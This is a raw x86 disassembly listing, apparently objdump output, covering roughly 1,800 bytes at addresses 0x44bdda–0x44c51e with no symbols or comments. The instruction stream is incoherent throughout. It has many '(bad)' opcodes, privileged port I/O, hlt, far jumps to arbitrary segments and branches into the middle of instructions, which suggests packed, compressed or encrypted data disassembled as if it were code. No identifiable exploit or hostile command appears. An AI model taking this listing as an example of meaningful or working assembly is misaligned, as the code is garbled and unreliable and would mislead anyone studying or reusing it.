  44bdda:	out    dx,al
  44bddb:	xchg   BYTE PTR [edx-0x45],bh
  44bdde:	inc    esp
  44bddf:	dec    ecx
  44bde0:	mov    ch,0xfb
  44bde2:	repnz outs dx,DWORD PTR ds:[esi]
  44bde4:	xchg   edx,eax
  44bde5:	call   0x283862
  44bdea:	jbe    0x44be23
  44bdec:	cs push ebp
  44bdee:	inc    ebx
  44bdef:	leave  
  44bdf0:	mov    ah,0x50
  44bdf2:	out    dx,eax
  44bdf3:	dec    esi
  44bdf4:	cdq    
  44bdf5:	hlt    
  44bdf6:	imul   ecx,DWORD PTR [esi-0x60],0xfffffff7
  44bdfa:	dec    esi
  44bdfb:	dec    edx
  44bdfc:	mov    bh,0x0
  44bdfe:	jg     0x44bd8d
  44be00:	cmp    dh,cl
  44be02:	jle    0x44bd8d
  44be04:	dec    eax
  44be05:	dec    ebp
  44be06:	mov    ch,0x64
  44be08:	ror    BYTE PTR [eax+0x7b],cl
  44be0b:	xor    BYTE PTR [esi+0x666556de],0x24
  44be12:	dec    edx
  44be13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44be14:	idiv   BYTE PTR [edi-0x586b0b18]
  44be1a:	scas   al,BYTE PTR es:[edi]
  44be1b:	dec    ebx
  44be1c:	add    al,0x12
  44be1e:	aaa    
  44be1f:	mov    bl,0x46
  44be21:	cmp    DWORD PTR [ecx],ecx
  44be23:	cli    
  44be24:	sbb    bl,cl
  44be26:	mov    ebp,DWORD PTR [edi]
  44be28:	into   
  44be29:	loopne 0x44be03
  44be2b:	call   0x7d039a10
  44be30:	xchg   DWORD PTR [esi-0x5f7576d9],edi
  44be36:	xchg   edi,eax
  44be37:	push   ecx
  44be38:	mov    eax,0x468256fd
  44be3d:	jecxz  0x44bdcb
  44be3f:	sbb    DWORD PTR [eiz*8-0x586c4e73],esi
  44be46:	dec    edx
  44be47:	push   ecx
  44be48:	mov    eax,0x8add48a8
  44be4d:	cmp    edi,esp
  44be4f:	and    BYTE PTR [ecx-0x4eb3c6a6],0x68
  44be56:	lea    ebx,[ebp-0x2dcd501f]
  44be5c:	fcmove st,st(7)
  44be5e:	pop    ebp
  44be5f:	rcr    esi,cl
  44be61:	mov    bh,0xa
  44be63:	xchg   BYTE PTR [eax],al
  44be65:	das    
  44be66:	or     al,BYTE PTR [eax]
  44be68:	sbb    al,0x31
  44be6a:	inc    esp
  44be6b:	mov    ch,BYTE PTR [esi-0x5e]
  44be6e:	sub    DWORD PTR [ecx+0x652ca591],edi
  44be74:	nop
  44be75:	shr    dl,0x33
  44be78:	popf   
  44be79:	aas    
  44be7a:	sub    BYTE PTR [ecx-0x2521d210],dh
  44be80:	fiadd  WORD PTR [eax]
  44be82:	dec    esp
  44be83:	dec    esi
  44be84:	xchg   edi,eax
  44be85:	pop    ecx
  44be86:	leave  
  44be87:	jge    0x44be10
  44be89:	mov    dh,0x35
  44be8b:	mov    edi,0x225702f1
  44be90:	xchg   ebp,eax
  44be91:	mov    BYTE PTR [eax+0x57],ah
  44be94:	test   al,0x40
  44be96:	es dec edi
  44be98:	test   edx,eax
  44be9a:	data16 jns 0x44beb1
  44be9d:	popf   
  44be9e:	cmc    
  44be9f:	jp     0x44be38
  44bea1:	pop    ebx
  44bea2:	dec    ebp
  44bea3:	xchg   BYTE PTR [edx-0x3c],cl
  44bea6:	imul   bl
  44bea8:	idiv   BYTE PTR es:[esi+0x64]
  44beac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bead:	sti    
  44beae:	ins    BYTE PTR es:[edi],dx
  44beaf:	and    edx,0xfffffffd
  44beb2:	outs   dx,BYTE PTR ds:[esi]
  44beb3:	out    dx,al
  44beb4:	mov    BYTE PTR [eax+0x2c3e8765],al
  44beba:	dec    esp
  44bebb:	shr    ebp,0x81
  44bebe:	mov    edx,0xbedde6f4
  44bec3:	push   ebx
  44bec4:	int    0xfa
  44bec6:	(bad)  
  44bec7:	pop    eax
  44bec8:	jne    0x44bf2a
  44beca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44becb:	sub    esi,DWORD PTR [edx-0x56ca595e]
  44bed1:	and    al,0x5c
  44bed3:	ins    BYTE PTR es:[edi],dx
  44bed4:	repz shr BYTE PTR [eax+0xe],0x39
  44bed9:	inc    DWORD PTR [edi]
  44bedb:	sbb    dl,bl
  44bedd:	rol    BYTE PTR [eax+0x58],0x8f
  44bee1:	pop    ebx
  44bee2:	dec    eax
  44bee3:	push   edx
  44bee4:	push   esp
  44bee5:	xchg   esp,eax
  44bee6:	mov    dh,0x4a
  44bee8:	inc    ebx
  44bee9:	lods   eax,DWORD PTR ds:[esi]
  44beea:	xchg   edx,eax
  44beeb:	test   eax,0x7863226a
  44bef0:	ds cwde 
  44bef2:	dec    eax
  44bef3:	je     0x44bee3
  44bef5:	add    ecx,DWORD PTR [ecx-0x23]
  44bef8:	lea    eax,[edi]
  44befa:	cmc    
  44befb:	dec    esp
  44befc:	sahf   
  44befd:	stc    
  44befe:	xchg   esp,eax
  44beff:	mov    edx,ebx
  44bf01:	pop    ecx
  44bf02:	xor    al,BYTE PTR [ebx+esi*8-0x65]
  44bf06:	imul   esp,ebp,0x99552cde
  44bf0c:	out    dx,eax
  44bf0d:	in     al,0x16
  44bf0f:	test   DWORD PTR [esi+0x78],ebp
  44bf12:	fisttp WORD PTR [ecx-0x1f]
  44bf15:	jl     0x44beac
  44bf17:	add    dl,BYTE PTR fs:[ebx-0x5d]
  44bf1b:	cmp    BYTE PTR [esi],bh
  44bf1d:	stos   DWORD PTR es:[edi],eax
  44bf1e:	mov    edi,DWORD PTR [ecx]
  44bf20:	mov    esi,0xf35908e1
  44bf26:	and    edx,DWORD PTR [eax]
  44bf28:	mov    al,0xe8
  44bf2a:	push   edi
  44bf2b:	mov    DWORD PTR [esi-0x57a30870],eax
  44bf31:	jl     0x44bf35
  44bf33:	mov    DWORD PTR [esi],ebx
  44bf35:	repnz daa 
  44bf37:	gs cdq 
  44bf39:	mov    ds:0xe0a6d146,al
  44bf3e:	inc    ebx
  44bf3f:	fnstenv [edi-0x37af1020]
  44bf45:	xlat   BYTE PTR ds:[ebx]
  44bf46:	add    BYTE PTR [esi-0x2c],bl
  44bf49:	daa    
  44bf4a:	dec    esi
  44bf4b:	xchg   edx,eax
  44bf4c:	fisubr WORD PTR ds:0xb7eba153
  44bf52:	popa   
  44bf53:	imul   ecx,ecx,0xc2553274
  44bf59:	push   ecx
  44bf5a:	mov    ds:0x93fb3e2d,eax
  44bf5f:	ds aam 0xc6
  44bf62:	idiv   DWORD PTR [esi+ebp*4]
  44bf65:	inc    edi
  44bf66:	xor    esp,DWORD PTR [ebp+0x2ef09d72]
  44bf6c:	mov    dl,0xf
  44bf6e:	cs add al,0xb1
  44bf71:	mov    ah,0x33
  44bf73:	push   cs
  44bf74:	popf   
  44bf75:	or     edi,DWORD PTR [ecx]
  44bf77:	cmp    al,0x2a
  44bf79:	fld    QWORD PTR [eax+0x6d7af7e9]
  44bf7f:	jae    0x44bff3
  44bf81:	(bad)  
  44bf82:	inc    edi
  44bf83:	je     0x44bfef
  44bf85:	dec    edx
  44bf86:	sub    DWORD PTR [eax-0x3e681702],ebp
  44bf8c:	add    dl,0x92
  44bf8f:	inc    eax
  44bf90:	sub    BYTE PTR [ecx],ah
  44bf92:	outs   dx,DWORD PTR ds:[esi]
  44bf93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bf94:	mov    dl,0x9e
  44bf96:	lock sub DWORD PTR [ecx-0x49dd5fbd],ebp
  44bf9d:	xchg   esi,eax
  44bf9e:	sub    eax,0x35fd2e2b
  44bfa3:	fnstenv [eax-0x71b90428]
  44bfa9:	inc    edx
  44bfaa:	inc    ecx
  44bfab:	dec    ebp
  44bfac:	mov    ah,0x22
  44bfae:	and    BYTE PTR [eax+0x5d],al
  44bfb1:	out    dx,al
  44bfb2:	xchg   edi,eax
  44bfb3:	inc    edx
  44bfb4:	lods   al,BYTE PTR ds:[esi]
  44bfb5:	out    0xfc,eax
  44bfb7:	mov    ebx,0x615e6108
  44bfbc:	test   eax,0xb8a401f0
  44bfc1:	in     eax,dx
  44bfc2:	out    0xcb,eax
  44bfc4:	lods   al,BYTE PTR ds:[esi]
  44bfc5:	in     al,dx
  44bfc6:	test   DWORD PTR [edx],0x15fdef2b
  44bfcc:	shr    ebx,0x29
  44bfcf:	fld    QWORD PTR [ebx+eiz*2-0x56]
  44bfd3:	ins    BYTE PTR es:[edi],dx
  44bfd4:	jae    0x44bfd6
  44bfd6:	out    dx,al
  44bfd7:	outs   dx,BYTE PTR ds:[esi]
  44bfd8:	xor    ebx,DWORD PTR [ebp+0x5d6368f6]
  44bfde:	dec    esi
  44bfdf:	test   al,0x5a
  44bfe1:	mov    eax,ds:0x5fdea4eb
  44bfe6:	add    ch,BYTE PTR [ecx-0x3e9f7ee1]
  44bfec:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bfee:	lods   al,BYTE PTR ds:[esi]
  44bfef:	scas   eax,DWORD PTR es:[edi]
  44bff0:	ds test eax,0xb0e68fac
  44bff6:	(bad)  
  44bff7:	lahf   
  44bff8:	js     0x44c019
  44bffa:	scas   al,BYTE PTR es:[edi]
  44bffb:	inc    ecx
  44bffc:	lods   eax,DWORD PTR ds:[esi]
  44bffd:	cmp    al,0x5
  44bfff:	jno    0x44bf96
  44c001:	test   al,0x60
  44c003:	cmp    dh,bh
  44c005:	das    
  44c006:	inc    edx
  44c007:	or     eax,0x47483c3e
  44c00c:	retf   
  44c00d:	icebp  
  44c00e:	ins    BYTE PTR es:[edi],dx
  44c00f:	push   ebp
  44c010:	(bad)  
  44c011:	popf   
  44c012:	mov    dh,0xa3
  44c014:	sub    ch,BYTE PTR [ecx-0xf]
  44c017:	(bad)  
  44c018:	ss push cs
  44c01a:	or     al,0xd0
  44c01c:	out    dx,al
  44c01d:	sbb    eax,edi
  44c01f:	ror    BYTE PTR [ecx+0x18],cl
  44c022:	out    0xdf,eax
  44c024:	pop    esp
  44c025:	adc    ecx,DWORD PTR ds:0xa853d872
  44c02b:	mov    ch,ch
  44c02d:	lock je 0x44bfd5
  44c030:	cmp    ebp,0x7b
  44c033:	mov    ds:0x997d7cc0,al
  44c038:	in     eax,0x61
  44c03a:	cmp    eax,0xed5d22b9
  44c03f:	aas    
  44c040:	push   0xffffffd6
  44c042:	mov    BYTE PTR [ebx-0xa7191c4],ah
  44c048:	fild   QWORD PTR [esi]
  44c04a:	imul   edi,edx,0xffffffdf
  44c04d:	xor    ch,BYTE PTR [ebx+0x8]
  44c050:	sti    
  44c051:	ret    
  44c052:	(bad)  
  44c053:	cld    
  44c054:	pop    esp
  44c055:	cmp    al,0x99
  44c057:	pop    edi
  44c058:	push   edx
  44c059:	cmp    esi,edx
  44c05b:	jmp    DWORD PTR ds:0x2ef168df
  44c061:	cmp    al,0x1a
  44c063:	call   0xf961:0x2f61435
  44c06a:	in     al,dx
  44c06b:	jns    0x44c069
  44c06d:	dec    edx
  44c06e:	sbb    eax,0xd11325e4
  44c073:	arpl   si,si
  44c075:	aas    
  44c076:	adc    al,0x2
  44c078:	cmc    
  44c079:	rcr    BYTE PTR [ebp+0x16],cl
  44c07c:	push   ecx
  44c07d:	cmp    al,0xc2
  44c07f:	mov    bl,0x21
  44c081:	int3   
  44c082:	retf   
  44c083:	push   es
  44c084:	lods   eax,DWORD PTR ds:[esi]
  44c085:	and    bl,bl
  44c087:	cdq    
  44c088:	stc    
  44c089:	cmp    dh,BYTE PTR ds:0xdc7326c1
  44c08f:	inc    eax
  44c090:	pop    esp
  44c091:	cmp    ecx,ebp
  44c093:	lds    eax,FWORD PTR ds:0x15fec94c
  44c099:	jno    0x44c0b5
  44c09b:	or     eax,0xbaaa24ff
  44c0a0:	gs and bl,BYTE PTR cs:[ebx+0x3e]
  44c0a5:	xor    DWORD PTR [eax],ecx
  44c0a7:	int3   
  44c0a8:	fcomp  QWORD PTR [edi-0x3ae2c293]
  44c0ae:	std    
  44c0af:	cli    
  44c0b0:	dec    edx
  44c0b1:	jl     0x44c0d1
  44c0b3:	xor    ecx,DWORD PTR [esi*2+0x78b9f3c6]
  44c0ba:	xor    BYTE PTR [edi-0x4dfa8cae],0x65
  44c0c1:	push   0xffffff97
  44c0c3:	xchg   esi,eax
  44c0c4:	mov    dh,0x76
  44c0c6:	lock xor ecx,DWORD PTR [edx+0x6e]
  44c0ca:	imul   ebp,DWORD PTR [ecx+0x27876be0],0x46
  44c0d1:	pop    esp
  44c0d2:	xlat   BYTE PTR ds:[ebx]
  44c0d3:	mov    dh,0x84
  44c0d5:	fs ror edi,1
  44c0d8:	in     eax,dx
  44c0d9:	mov    al,ds:0xe84432ec
  44c0de:	inc    edx
  44c0df:	mov    eax,0xbdb20faf
  44c0e4:	xor    BYTE PTR [eax+0x26],cl
  44c0e7:	mov    es,WORD PTR [ebp+0x2b]
  44c0ea:	scas   al,BYTE PTR es:[edi]
  44c0eb:	pop    eax
  44c0ec:	shl    bh,cl
  44c0ee:	(bad)  
  44c0ef:	adc    eax,0x90d638ea
  44c0f4:	mov    eax,0x6a7ad24c
  44c0f9:	js     0x44c175
  44c0fb:	in     eax,dx
  44c0fc:	jle    0x44c172
  44c0fe:	jne    0x44c0dd
  44c100:	leave  
  44c101:	ja     0x44c0ca
  44c103:	ret    0xb520
  44c106:	scas   al,BYTE PTR es:[edi]
  44c107:	cs cmc 
  44c109:	cli    
  44c10a:	sub    BYTE PTR [esi+0x3a],bl
  44c10d:	cmp    edx,esp
  44c10f:	fisttp WORD PTR [edx-0x12]
  44c112:	adc    BYTE PTR [edi-0x5a8edfd7],dh
  44c118:	ins    DWORD PTR es:[edi],dx
  44c119:	adc    eax,0x52efbaac
  44c11e:	xchg   esp,eax
  44c11f:	(bad)  
  44c120:	push   ebp
  44c121:	xlat   BYTE PTR ds:[ebx]
  44c122:	fmul   DWORD PTR [edx]
  44c124:	popa   
  44c125:	cmp    eax,0xe1e16ba
  44c12a:	scas   eax,DWORD PTR es:[edi]
  44c12b:	mov    edx,0x468af2ea
  44c130:	bound  edi,QWORD PTR ds:[esp+edi*1-0x2f51c157]
  44c138:	xlat   BYTE PTR ds:[ebx]
  44c139:	(bad)  
  44c13a:	adc    al,0x25
  44c13c:	jmp    0xb339770d
  44c141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c142:	nop
  44c143:	pop    ebx
  44c144:	imul   ecx,DWORD PTR [ecx],0x7bfa09c4
  44c14a:	xlat   BYTE PTR ds:[ebx]
  44c14b:	popa   
  44c14c:	out    dx,eax
  44c14d:	push   ebx
  44c14e:	mov    es,WORD PTR [ebp+0x52c91eb6]
  44c154:	aas    
  44c155:	and    DWORD PTR [esi],ecx
  44c157:	loope  0x44c0f2
  44c159:	lods   al,BYTE PTR ds:[esi]
  44c15a:	fist   DWORD PTR [ecx]
  44c15c:	inc    edx
  44c15d:	int3   
  44c15e:	rcr    esp,1
  44c160:	cmp    al,0x1f
  44c162:	pop    ebx
  44c163:	les    eax,FWORD PTR [edx]
  44c165:	mov    bh,0x9c
  44c167:	aad    0xc3
  44c169:	lock mov dh,0xa1
  44c16c:	dec    edi
  44c16d:	sbb    eax,0x7b0c5f1b
  44c172:	cmp    eax,0x3502c0f3
  44c177:	mov    ds:0x94e8a83a,eax
  44c17c:	or     dl,bh
  44c17e:	xor    bh,bh
  44c180:	lods   eax,DWORD PTR ds:[esi]
  44c181:	xor    al,0x83
  44c183:	iret   
  44c184:	add    bl,BYTE PTR [edi-0xb]
  44c187:	test   eax,0xacf0f15a
  44c18c:	std    
  44c18d:	sub    eax,0x3f01060e
  44c192:	shr    cl,cl
  44c194:	aaa    
  44c195:	and    esi,0xf032f2f5
  44c19b:	lods   eax,DWORD PTR ds:[esi]
  44c19c:	inc    eax
  44c19d:	sub    al,0xdc
  44c19f:	pop    esi
  44c1a0:	cmp    BYTE PTR [ebx-0x6cb90735],bh
  44c1a6:	sbb    al,0xbe
  44c1a8:	jecxz  0x44c1e1
  44c1aa:	pop    ds
  44c1ab:	adc    BYTE PTR [ebx],al
  44c1ad:	sub    BYTE PTR [eax],al
  44c1af:	pop    es
  44c1b0:	jmp    0xc84:0x3868d7e4
  44c1b7:	mov    ds:0xc31d2b44,al
  44c1bc:	ficomp WORD PTR ds:[edx]
  44c1bf:	inc    DWORD PTR ds:0xea79c93b
  44c1c5:	or     bh,BYTE PTR ds:0xcf958bf3
  44c1cb:	xchg   ah,bh
  44c1cd:	inc    ebx
  44c1ce:	sbb    eax,0x205c2ebf
  44c1d3:	sahf   
  44c1d4:	push   0xeaad89e1
  44c1d9:	cs into 
  44c1db:	cmc    
  44c1dc:	cs sbb al,dl
  44c1df:	push   es
  44c1e0:	add    edi,esp
  44c1e2:	mov    al,0x49
  44c1e4:	das    
  44c1e5:	sbb    BYTE PTR [esi],ah
  44c1e7:	inc    ecx
  44c1e8:	jmp    0x16488fc8
  44c1ed:	cmp    dl,bl
  44c1ef:	jmp    0xc6e41315
  44c1f4:	popa   
  44c1f5:	cmp    al,0xdd
  44c1f7:	cmc    
  44c1f8:	mov    eax,ds:0xa4d0ca88
  44c1fd:	jo     0x44c1d7
  44c1ff:	fild   WORD PTR [edx]
  44c201:	xchg   esp,eax
  44c202:	(bad)  
  44c203:	mov    dl,BYTE PTR [ecx+0x44]
  44c206:	lock (bad) 
  44c208:	push   edi
  44c209:	sbb    al,0xe6
  44c20b:	neg    DWORD PTR [ecx-0x7c228aef]
  44c211:	sub    ah,BYTE PTR [edi]
  44c213:	std    
  44c214:	ds ja  0x44c1ff
  44c217:	mov    al,0x70
  44c219:	cmp    ch,dl
  44c21b:	pop    es
  44c21c:	jnp    0x44c1df
  44c21e:	pop    ds
  44c21f:	loop   0x44c238
  44c221:	inc    eax
  44c222:	fmul   DWORD PTR ds:0x38568254
  44c228:	cmc    
  44c229:	sub    esp,DWORD PTR [esp+eax*1+0x7f]
  44c22d:	pop    esp
  44c22e:	stos   DWORD PTR es:[edi],eax
  44c22f:	adc    eax,0x2d23ffc
  44c234:	xchg   esp,eax
  44c235:	lods   al,BYTE PTR ds:[esi]
  44c236:	and    al,al
  44c238:	rcr    DWORD PTR [ecx*4-0x2f8e66db],1
  44c23f:	and    eax,0x4c9b6906
  44c244:	and    BYTE PTR [ebx+0x62],al
  44c247:	push   ecx
  44c248:	dec    esi
  44c249:	fmulp  st(2),st
  44c24b:	add    eax,0x9b41c9ee
  44c250:	mov    eax,ds:0x1b53b43d
  44c255:	dec    edi
  44c256:	lods   eax,DWORD PTR ds:[esi]
  44c257:	adc    eax,0xf8f42e11
  44c25c:	adc    ah,bl
  44c25e:	je     0x44c23a
  44c260:	push   ebx
  44c261:	outs   dx,BYTE PTR ds:[esi]
  44c262:	xchg   ecx,eax
  44c264:	push   es
  44c265:	pop    ebx
  44c266:	(bad)  
  44c267:	cmp    DWORD PTR [edx+ecx*1+0x5f],edx
  44c26b:	xchg   ebp,eax
  44c26c:	das    
  44c26d:	outs   dx,DWORD PTR ds:[esi]
  44c26e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c26f:	div    BYTE PTR [eax]
  44c271:	inc    eax
  44c272:	ror    DWORD PTR [ebx-0x75e0e3df],1
  44c278:	inc    esp
  44c279:	jb     0x44c245
  44c27b:	jns    0x44c268
  44c27d:	mov    cl,0x2c
  44c27f:	in     al,0x1f
  44c281:	sbb    dh,BYTE PTR [ecx-0x62]
  44c284:	scas   eax,DWORD PTR es:[edi]
  44c285:	jae    0x44c277
  44c287:	xor    al,0x6
  44c289:	ins    DWORD PTR es:[edi],dx
  44c28a:	add    eax,0xc2b1054
  44c28f:	adc    esp,esi
  44c291:	push   0xe
  44c293:	mov    ds:0xb2de7ca1,eax
  44c298:	lods   eax,DWORD PTR gs:[esi]
  44c29a:	aaa    
  44c29b:	sub    al,0x1d
  44c29d:	xchg   ebp,eax
  44c29e:	push   0x9cddb027
  44c2a3:	push   cs
  44c2a4:	push   ebp
  44c2a5:	out    dx,al
  44c2a6:	test   DWORD PTR [ebx-0x7ead944e],edi
  44c2ac:	mov    edx,0x51ea6415
  44c2b1:	or     eax,0x6e06fbcf
  44c2b6:	and    eax,0xcc6735b6
  44c2bb:	or     al,0x2a
  44c2bd:	jo     0x44c264
  44c2bf:	pop    ecx
  44c2c0:	cmp    al,0x66
  44c2c2:	enter  0xfaa9,0xb6
  44c2c6:	stos   BYTE PTR es:[edi],al
  44c2c7:	test   al,0x5b
  44c2c9:	xor    eax,edi
  44c2cb:	cmc    
  44c2cc:	and    al,0x2c
  44c2ce:	(bad)  
  44c2d0:	inc    ecx
  44c2d1:	push   edi
  44c2d2:	mov    dl,BYTE PTR ds:0x4920ed66
  44c2d8:	or     BYTE PTR [ecx-0x14],dh
  44c2db:	dec    edx
  44c2dc:	dec    edx
  44c2dd:	and    DWORD PTR [ebx-0x46],esp
  44c2e0:	sti    
  44c2e1:	pushf  
  44c2e2:	adc    BYTE PTR [edi-0x72f61c63],ah
  44c2e8:	out    0x58,al
  44c2ea:	icebp  
  44c2eb:	test   eax,0xa8208166
  44c2f0:	adc    eax,0x97a2ec1b
  44c2f5:	(bad)  
  44c2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c2f8:	mov    BYTE PTR [edi+0x51],bl
  44c2fb:	rcr    BYTE PTR [edi-0x5f],1
  44c2fe:	inc    edx
  44c2ff:	fiadd  WORD PTR es:[ebp+0x7736219b]
  44c306:	ja     0x44c2a0
  44c308:	dec    esp
  44c309:	pop    edx
  44c30a:	xchg   esi,eax
  44c30b:	sub    ah,BYTE PTR [edi+0x5b]
  44c30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c30f:	call   0x6059:0x1b42951a
  44c316:	bound  esi,QWORD PTR [edx-0x765b829a]
  44c31c:	push   ds
  44c31d:	shl    DWORD PTR [edi+0x7dd93f04],cl
  44c323:	inc    ebp
  44c324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c325:	cwde   
  44c326:	dec    edx
  44c327:	xor    eax,0xb7c126a4
  44c32d:	aam    0xa7
  44c32f:	add    al,0x3f
  44c331:	rol    DWORD PTR [edx-0x3164be67],1
  44c337:	xchg   ebx,eax
  44c338:	outs   dx,BYTE PTR ds:[esi]
  44c339:	jmp    0x6d96de31
  44c33e:	xchg   BYTE PTR [ecx+0x19],bh
  44c341:	push   ecx
  44c342:	jmp    0x591b:0x524d4628
  44c349:	push   ecx
  44c34a:	repnz mov esp,0x2abc494a
  44c350:	dec    esi
  44c351:	js     0x44c34d
  44c353:	xchg   esp,eax
  44c354:	cli    
  44c355:	ins    BYTE PTR es:[edi],dx
  44c356:	mov    esi,0xfa454590
  44c35b:	add    al,0x16
  44c35d:	adc    esi,edi
  44c35f:	mov    ecx,0xecca4d3a
  44c364:	push   cs
  44c365:	push   ecx
  44c366:	adc    eax,0x863d4abd
  44c36b:	ror    DWORD PTR [esi+0x78],1
  44c36e:	sbb    dl,BYTE PTR [ebp-0x6f411b06]
  44c374:	inc    ebp
  44c375:	gs cli 
  44c377:	add    al,0x8a
  44c379:	adc    dh,bh
  44c37b:	mov    ebx,0x2aaa011a
  44c380:	inc    eax
  44c381:	push   ecx
  44c382:	mov    dl,0x16
  44c384:	dec    edx
  44c385:	js     0x44c385
  44c387:	sub    ecx,DWORD PTR [esi+0x4c]
  44c38a:	mov    edx,0x7de5c01c
  44c38f:	xchg   ecx,eax
  44c390:	adc    dl,BYTE PTR [esi]
  44c392:	cli    
  44c393:	ret    0xdfda
  44c396:	inc    BYTE PTR [edi+eiz*1]
  44c399:	dec    ebp
  44c39a:	or     al,0x45
  44c39c:	pop    DWORD PTR [eax-0x2455aba5]
  44c3a2:	ret    0x6024
  44c3a5:	popf   
  44c3a6:	mov    esp,0xca729c21
  44c3ab:	push   edi
  44c3ac:	test   eax,0x3dcfc80
  44c3b1:	inc    eax
  44c3b2:	gs push ecx
  44c3b4:	add    eax,0x7af2d83f
  44c3b9:	daa    
  44c3ba:	lods   al,BYTE PTR ds:[esi]
  44c3bb:	loope  0x44c417
  44c3bd:	sbb    cl,cl
  44c3bf:	hlt    
  44c3c0:	push   cs
  44c3c1:	mov    cl,BYTE PTR [eax+0x3b42fa68]
  44c3c7:	ror    eax,1
  44c3c9:	jl     0x44c432
  44c3cb:	xlat   BYTE PTR ds:[ebx]
  44c3cc:	add    eax,0xdc3a7598
  44c3d1:	cli    
  44c3d2:	lods   eax,DWORD PTR ds:[esi]
  44c3d3:	clc    
  44c3d4:	mov    gs,WORD PTR [esi-0x2]
  44c3d7:	xor    ebx,DWORD PTR [esp+eax*1]
  44c3da:	stos   BYTE PTR es:[edi],al
  44c3db:	sbb    ah,BYTE PTR [esi+ebx*1-0x51]
  44c3df:	(bad)  
  44c3e1:	or     al,0xb2
  44c3e3:	test   al,0xa
  44c3e5:	sbb    BYTE PTR [ecx-0x6bc83903],dh
  44c3eb:	and    ebx,esi
  44c3ed:	add    DWORD PTR [edx+eax*1-0x1d59e117],edi
  44c3f4:	outs   dx,DWORD PTR ds:[esi]
  44c3f5:	pop    ss
  44c3f6:	fld    QWORD PTR [ebx]
  44c3f8:	cld    
  44c3f9:	mov    esp,0x1526d3ed
  44c3fe:	mov    bh,0xe1
  44c400:	push   cs
  44c401:	mov    ds:0x44fcbc83,eax
  44c406:	inc    ecx
  44c407:	xlat   BYTE PTR ds:[ebx]
  44c408:	ror    al,1
  44c40a:	cmp    ah,BYTE PTR [edx]
  44c40c:	not    DWORD PTR [eax]
  44c40e:	pusha  
  44c40f:	and    al,0x58
  44c411:	sbb    eax,0xd9681fb2
  44c416:	dec    esi
  44c417:	fiadd  WORD PTR [ebx]
  44c419:	cmp    eax,0x77a30d9
  44c41e:	test   al,0x78
  44c420:	inc    edx
  44c421:	adc    ebx,ebx
  44c423:	cmp    al,0x49
  44c425:	outs   dx,BYTE PTR ds:[esi]
  44c426:	mov    bl,0xd6
  44c428:	scas   al,BYTE PTR es:[edi]
  44c429:	push   cs
  44c42a:	mov    ebx,0x8811f3d9
  44c42f:	loope  0x44c3bf
  44c431:	pop    ss
  44c432:	add    dl,cl
  44c434:	js     0x44c3c3
  44c436:	or     bh,BYTE PTR [esi+0x61]
  44c439:	sbb    DWORD PTR [ecx-0x4ce65e1c],esi
  44c43f:	pop    ds
  44c440:	push   ds
  44c441:	in     al,dx
  44c442:	fimul  WORD PTR [edx-0x2553bffa]
  44c448:	and    BYTE PTR [esi+0x180bd6ed],ah
  44c44e:	mov    al,0x1a
  44c450:	pop    edx
  44c451:	sbb    al,0xba
  44c453:	mov    WORD PTR [edx],es
  44c455:	cmp    eax,0x674e11da
  44c45a:	xchg   esi,eax
  44c45b:	in     al,0x96
  44c45d:	enter  0xb7f1,0x26
  44c461:	inc    eax
  44c462:	test   al,0x1a
  44c464:	mov    ds,WORD PTR ds:0x971fd3b9
  44c46a:	xor    BYTE PTR [ecx],cl
  44c46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c46d:	sbb    al,0xab
  44c46f:	cmp    al,0xd0
  44c471:	mov    al,0xb5
  44c473:	inc    edi
  44c474:	jns    0x44c44b
  44c476:	mov    ebx,0x5826601
  44c47b:	fistp  DWORD PTR [esi+0x1]
  44c47e:	call   0x8efa:0x88611bda
  44c485:	popa   
  44c486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c487:	xor    eax,0xe534cc12
  44c48c:	or     al,0x84
  44c48e:	or     eax,0xe934a1b0
  44c493:	xor    esp,ecx
  44c495:	cmp    BYTE PTR [esi+0x1fbf9085],0x8
  44c49c:	cwde   
  44c49d:	mov    dl,0xa2
  44c49f:	fstp   DWORD PTR [edx]
  44c4a1:	cs in  eax,0x5f
  44c4a4:	dec    esi
  44c4a5:	xor    DWORD PTR [edi],edx
  44c4a7:	xchg   edi,eax
  44c4a8:	cmp    eax,0xc594e751
  44c4ad:	clc    
  44c4ae:	jge    0x44c463
  44c4b0:	ss sbb al,0xb2
  44c4b3:	jp     0x44c499
  44c4b5:	and    BYTE PTR [ebx],bh
  44c4b7:	cmp    al,0xee
  44c4b9:	jl     0x44c477
  44c4bb:	stc    
  44c4bc:	loope  0x44c4b2
  44c4be:	fisttp DWORD PTR [edx+0x5f7000fa]
  44c4c4:	aam    0x81
  44c4c6:	fiadd  DWORD PTR [ecx+eax*1-0x6b]
  44c4ca:	or     al,0x6
  44c4cc:	mov    ecx,0x9819d2f
  44c4d1:	xor    ebx,DWORD PTR [eax+0x5009be55]
  44c4d7:	jmp    0x44c4ab
  44c4d9:	pop    ds
  44c4da:	scas   al,BYTE PTR es:[edi]
  44c4db:	fbld   TBYTE PTR [edx]
  44c4dd:	sbb    al,0xad
  44c4df:	mov    ecx,0x100b0d09
  44c4e4:	sti    
  44c4e5:	pusha  
  44c4e6:	or     eax,0xa5d276e9
  44c4eb:	push   0xffffff82
  44c4ed:	xor    dh,ch
  44c4ef:	sti    
  44c4f0:	mov    bl,0x5c
  44c4f2:	add    cl,BYTE PTR [edx-0x91d4db4]
  44c4f8:	jge    0x44c55a
  44c4fa:	mov    dh,0xcb
  44c4fc:	dec    edx
  44c4fd:	mov    ds:0xafd28fc7,al
  44c502:	out    dx,al
  44c503:	fwait
  44c504:	cmp    esi,edx
  44c506:	mov    cl,0xcc
  44c508:	cwde   
  44c509:	dec    ebp
  44c50a:	mul    BYTE PTR [edi+0x79ed187d]
  44c510:	(bad)  
  44c511:	push   eax
  44c512:	stc    
  44c513:	and    eax,DWORD PTR [edx+0x511beb70]
  44c519:	sbb    eax,0x5a53b50a
  44c51e:	add    ah,dl
